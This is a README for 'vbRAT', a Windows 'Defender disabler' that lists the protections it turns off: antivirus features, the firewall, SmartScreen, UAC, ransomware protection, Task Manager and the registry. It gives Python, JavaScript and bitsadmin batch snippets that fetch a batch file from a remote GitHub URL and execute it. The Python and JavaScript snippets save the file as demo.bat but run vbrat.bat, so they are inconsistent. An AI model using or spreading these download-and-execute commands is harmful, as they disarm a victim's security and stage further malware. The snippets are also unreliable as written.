# vbRAT


<h2 align="center">
  Defender disabler 

</h2>

---
## disable defender 
 -  PUAProtection 
 -  Automatic Sample Submission
 -  Windows FireWall
 -  Windows Smart Screen(Permanently)
 -  Disable Quickscan
 -  Add exe file  to exclusions in defender settings
 -  Disable Defender Notification (Added Recently)
 -  Disable UAC(Reboot Required)
 -  Disable Ransomware Protection
 -  Disable TaskManager
 -  Disable registry etc..
---


- [Python](https://www.python.org/):

```python
import requests, os
_file = requests.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat')

with open('demo.bat', 'w') as f:
    f.write(_file.text)

os.startfile('vbrat.bat')
```

- [Javascript](https://nodejs.org/en/):

```javascript
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

axios.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat', {
    responseType: 'text',
  }).then((response) => {
    fs.writeFileSync('demo.bat', response.data, { flag: 'a' }, (err) => {});
  });
exec('vbrat.bat');
```

- [Batch](https://en.wikipedia.org/wiki/Batch_file):

```batch
bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat "vbrat.bat"
start vbrat.bat
```

